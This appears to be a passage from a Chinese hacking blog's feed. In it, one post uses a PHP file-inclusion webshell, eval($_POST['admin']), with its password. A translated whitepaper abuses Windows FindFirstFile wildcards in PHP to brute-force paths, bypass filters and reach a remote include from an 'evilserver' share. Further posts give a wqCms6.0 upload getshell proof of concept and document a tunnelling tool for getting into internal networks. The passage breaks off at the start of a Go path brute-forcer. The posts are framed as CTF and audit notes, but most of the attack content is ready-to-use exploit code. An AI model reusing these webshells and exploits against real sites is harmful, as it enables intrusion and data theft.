<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span>. $_GET[page] . <span class="string">'.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h1 id="相关代码："><a href="#相关代码：" class="headerlink" title="相关代码："></a>相关代码：</h1><ol>
<li><p>php中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.txt中代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> phpinfo() <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>123456.TXT里面可以换成一句话木马，代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"admin"</span>]) <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>url:<a href="http://127.0.0.1/1.php?file=12" target="_blank" rel="external">http://127.0.0.1/1.php?file=12</a>&lt;&lt;<br>密码：admin<br><strong>注意</strong>：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】</p>
<p><img src="https://ooo.0o0.ooo/2017/03/04/58ba6bd6354d3.png" alt="acccc1eb9b5be30878b4f979f2edadfc.jpg.png"></p>
<h1 id="windows的文件系统机制引发的PHP路径爆破问题分析"><a href="#windows的文件系统机制引发的PHP路径爆破问题分析" class="headerlink" title="windows的文件系统机制引发的PHP路径爆破问题分析"></a>windows的文件系统机制引发的PHP路径爆破问题分析</h1><h2 id="开场白"><a href="#开场白" class="headerlink" title="开场白"></a>开场白</h2><p>此次所披露的是以下网页中提出的问题所取得的测试结果：</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">255</span>; $i++) &#123;</div><div class="line">		$url = <span class="string">'1.ph'</span> . chr($i);</div><div class="line">		$tmp = @file_get_contents($url);</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i) . <span class="string">" "</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>已知1.php存在，以上脚本访问的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">1.phP</div><div class="line">1.ph&lt;</div><div class="line">1.ph&gt;</div></pre></td></tr></table></figure></p>
<p>都能得到返回。<br>前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。</p>
<p>测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0</p>
<p>测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3</p>
<p>经测试我们得出的结论是：<strong>该漏洞影响所有的windows+php版本</strong></p>
<h2 id="深入探查模糊测试的结果"><a href="#深入探查模糊测试的结果" class="headerlink" title="深入探查模糊测试的结果"></a>深入探查模糊测试的结果</h2><p>为了继续深入探查关于该bug的信息，我们对demo做了些许修改:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">for</span> ($j=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $j++) &#123;</div><div class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">256</span>; $i++) &#123;</div><div class="line">			$url = <span class="string">'1.p'</span> . chr($j) . chr($i);</div><div class="line">			$tmp = @file_get_contents($url);</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($j) . chr($i) . <span class="string">" "</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果<a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85" target="_blank" rel="external">(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx)</a>.aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：<a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3</a></p>
<p>但是此bug至今未被任何windows旗下所发行的任何版本修复!</p>
<p>我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：</p>
<p>此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">void</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])&#123;</div><div class="line">	WIN32_FIND_DATA FindFileData;</div><div class="line">	HANDLE hFind;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">2</span> )&#123;</div><div class="line">		_tprintf(TEXT(<span class="string">"Usage: %s [target_file] "</span>), argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	_tprintf (TEXT(<span class="string">"Target file is %s "</span>), argv[<span class="number">1</span>]);</div><div class="line">	hFind = FindFirstFile(argv[<span class="number">1</span>], &amp;FindFileData);</div><div class="line">	<span class="keyword">if</span> (hFind == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="built_in">printf</span> (<span class="string">"FindFirstFile failed (%d) "</span>, GetLastError());</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		_tprintf (TEXT(<span class="string">"The first file found is %s "</span>), FindFileData.cFileName);</div><div class="line">		FindClose(hFind);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当传入参数”c:o&lt;”时，成功访问到boot.ini文件。</p>
<h2 id="利用方法总结"><a href="#利用方法总结" class="headerlink" title="利用方法总结"></a>利用方法总结</h2><ol>
<li><p>当调用FindFirstFile()函数时，”&lt;”被替换成” <em> ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成”</em>”,应当采用”&lt;&lt;”**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell&lt;&apos;);  或者include(‘shell&lt;&lt;&apos;);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include(‘shell.p&gt;p&apos;);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。</div></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”””(双引号)被替换成”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:include(‘shell”php&apos;);    //===&gt;include(‘shell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>如果文件名第一个字符是”.”的话，读取时可以忽略之</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(‘.htacess&apos;);  //==&gt;fopen(‘htacess&apos;);   //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：fopen(“config.ini\.// ///.”);==&gt;  fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;)   //译者注：此处的利用我不是很理解，有何作用？截断？</div></pre></td></tr></table></figure>
</li>
<li><p>该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXAMPLE：include (‘\evilservershell.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>用以下方法还可以切换文件的盘名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include(‘\.C:myfile.php......D:anotherfile.php&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>选择磁盘命名语法可以用来绕过斜线字符过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_get_contents(‘C:boot.ini&apos;); //==&gt;  file_get_contents (‘C:/boot.ini&apos;);</div></pre></td></tr></table></figure>
</li>
<li><p>在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof</div><div class="line"></div><div class="line">EXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="更深入的利用方法"><a href="#更深入的利用方法" class="headerlink" title="更深入的利用方法"></a>更深入的利用方法</h2><p>除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤</p>
<p>请思考该例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	file_get_contents(<span class="string">"/images/"</span>.$_GET[<span class="string">'a'</span>].<span class="string">".jpg"</span>);</div><div class="line">	<span class="comment">//or another function from Table 1, i.e. include().</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问test.php?a=../a&lt;%00</p>
<p>可能出现两种结果</p>
<ol>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。</p>
</li>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。</p>
</li>
</ol>
<p>如果是第一种情况，说明不存在a打头的文件，第二种则存在。</p>
<p>此外，有记录显示，有时网站会抛出如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..</div></pre></td></tr></table></figure></p>
<p>这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。</p>
<p>因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。</p>
<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><blockquote>
<p>PHP application source code audits advanced technology:</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
<p>MSDN FindFirstFile Function reference:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx</a></p>
<p>MSDN comments history:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3</a></p>
<p>MSDN article «Naming Files, Paths, and Namespaces»:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx</a></p>
<p>Technet article «Managing Files and Directories»:</p>
<p><a href="http://technet.microsoft.com/en-us/library/cc722482.aspx" target="_blank" rel="external">http://technet.microsoft.com/en-us/library/cc722482.aspx</a></p>
<p>Paper «Technique of quick exploitation of 2blind SQL Injection»:</p>
<p><a href="http://www.exploit-db.com/papers/13696/" target="_blank" rel="external">http://www.exploit-db.com/papers/13696/</a></p>
</blockquote>
<hr>
<p>全文完。</p>
<p>注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。</p>
<p>文章转自群友</p>
<h1 id="版权声明："><a href="#版权声明：" class="headerlink" title="版权声明："></a>版权声明：</h1><p>文章所设计内容包括两部分<br>一是法师的书籍《代码审计-企业级web代码安全架构》<br>二是来自群友@evil7提供的资料<br>以下为资料原文：<br><a href="http://www.169it.com/blog_article/2302639890.html" target="_blank" rel="external">http://www.169it.com/blog_article/2302639890.html</a><br><a href="https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki" target="_blank" rel="external">https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。&lt;/p&gt;
&lt;p&gt;利用方法很简单，我们只要将文件名不可知部分之后的字符用”&amp;lt;”或者”&amp;gt;”代替即可，不过要注意一点是，只使用一个”&amp;lt;”或者”&amp;gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&amp;lt;”或者”1&amp;gt;”都是访问不到文件的，需要”1&amp;lt;&amp;lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>wqCms6.0在IIS6的Getshell</title>
    <link href="http://akkuman.coding.me/2017/02/22/wqCms6.0%E5%9C%A8IIS6%E7%9A%84Getshell.html"/>
    <id>http://akkuman.coding.me/2017/02/22/wqCms6.0在IIS6的Getshell.html</id>
    <published>2017-02-22T13:20:55.000Z</published>
    <updated>2017-03-03T14:48:13.452Z</updated>
    
    <content type="html"><![CDATA[<p>2017-02-15发布</p>
<h1 id="一、漏洞利用点"><a href="#一、漏洞利用点" class="headerlink" title="一、漏洞利用点"></a>一、漏洞利用点</h1><p>漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点<br><a id="more"></a></p>
<h1 id="二、hack-it"><a href="#二、hack-it" class="headerlink" title="二、hack it"></a>二、hack it</h1><p><img src="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg" alt="77e968abd5e5cb3e2c4cdfbe620568fa.jpg"><br><img src="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg" alt="7281e4d1334393ddcc1c4926ad0065a8.jpg"></p>
<h1 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin_UploadDataHandler.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"uploadify"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"saveFile"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">value</span>=<span class="string">"Submit Query"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>转自群友论坛文章<a href="http://loner.fm/article.php?id=24236" target="_blank" rel="external">wobushou</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017-02-15发布&lt;/p&gt;
&lt;h1 id=&quot;一、漏洞利用点&quot;&gt;&lt;a href=&quot;#一、漏洞利用点&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞利用点&quot;&gt;&lt;/a&gt;一、漏洞利用点&lt;/h1&gt;&lt;p&gt;漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>otunnel：一个和lcx差不多的端口转发的工具</title>
    <link href="http://akkuman.coding.me/2017/02/15/otunnel%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html"/>
    <id>http://akkuman.coding.me/2017/02/15/otunnel：一个和lcx差不多的端口转发的工具.html</id>
    <published>2017-02-15T12:58:16.000Z</published>
    <updated>2017-03-04T05:10:07.126Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/ooclab/otunnel" target="_blank" rel="external">ooclab/otunnel</a><br><a id="more"></a></p>
<h1 id="下载地址-内涵各大平台"><a href="#下载地址-内涵各大平台" class="headerlink" title="下载地址(内涵各大平台)"></a>下载地址(内涵各大平台)</h1><p><a href="http://dl.ooclab.com/otunnel/" target="_blank" rel="external">http://dl.ooclab.com/otunnel/</a></p>
<h1 id="otunnel-用法"><a href="#otunnel-用法" class="headerlink" title="otunnel 用法"></a>otunnel 用法</h1><p>前提：</p>
<ol>
<li>假设 server 的地址为 example.com</li>
<li>从 client 能连接 server (client 与 server 无需在同一个网络)</li>
</ol>
<p><strong>注意</strong>  otunnel 程序可以作为 server 和 client 两种角色（运行参数不同）</p>
<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel listen :10000 <span class="_">-s</span> longlongsecret</div></pre></td></tr></table></figure>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlongsecret -t <span class="string">'r:192.168.1.3:22::10022'</span></div></pre></td></tr></table></figure></p>
<p>现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22</p>
<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./otunnel connect example.com:10000 <span class="_">-s</span> longlonglongsecret -t <span class="string">'f::20080:127.0.0.1:3128'</span></div></pre></td></tr></table></figure></p>
<p>现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128</p>
<h2 id="程序用法"><a href="#程序用法" class="headerlink" title="程序用法"></a>程序用法</h2><h3 id="t-格式"><a href="#t-格式" class="headerlink" title="-t 格式"></a>-t 格式</h3><p>包含多个字段信息，以<code>:</code>隔开(为空的字段也不能省略<code>:</code>)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">代理类型:本地地址:本地端口:远程地址:远程端口</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>字段</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>代理类型</td>
<td style="text-align:center">r 表示反向代理; f 表示正向代理</td>
</tr>
<tr>
<td>本地地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>本地端口</td>
<td style="text-align:center">整数</td>
</tr>
<tr>
<td>远程地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>远程端口</td>
<td style="text-align:center">整数</td>
</tr>
</tbody>
</table>
<p><strong>注意</strong></p>
<ol>
<li><code>本地地址</code>或<code>远程地址</code>如果为空，表示所有网口</li>
<li>otunnel 命令行可以包含多个<code>-t</code>选项，同时指定多条隧道规则</li>
</ol>
<h1 id="特点及优势"><a href="#特点及优势" class="headerlink" title="特点及优势"></a>特点及优势</h1><p>otunnel 是一款对称的安全隧道工具。</p>
<ul>
<li>单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。</li>
<li>支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。</li>
<li>无需配置文件：命令行使用</li>
<li>对称设计：同时支持 正、反向代理（端口映射）</li>
<li>安全加密：支持 AES 对称加密</li>
</ul>
<p><img src="https://ooo.0o0.ooo/2017/02/15/58a455a1b0a71.png" alt="otunnel反向代理图示"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境&lt;/p&gt;
&lt;h1 id=&quot;项目地址&quot;&gt;&lt;a href=&quot;#项目地址&quot; class=&quot;headerlink&quot; title=&quot;项目地址&quot;&gt;&lt;/a&gt;项目地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/ooclab/otunnel&quot;&gt;ooclab/otunnel&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Golang初练手-多线程网站路径爆破</title>
    <link href="http://akkuman.coding.me/2017/02/08/first-practice-for-Golang-Multithread-Website-Burster.html"/>
    <id>http://akkuman.coding.me/2017/02/08/first-practice-for-Golang-Multithread-Website-Burster.html</id>
    <published>2017-02-07T17:25:48.000Z</published>
    <updated>2017-03-04T05:26:58.799Z</updated>
    
    <content type="html"><![CDATA[<p>以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍</p>
<p>先放张图<img src="https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif" alt="演示1.gif"><br><a id="more"></a></p>
<p>用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5</div><div class="line">Buster是你的程序名字</div><div class="line">-u后面填网址参数，格式如上</div><div class="line">-d选字典</div><div class="line">-t是线程数</div><div class="line">当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的</div></pre></td></tr></table></figure></p>
<p>话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div 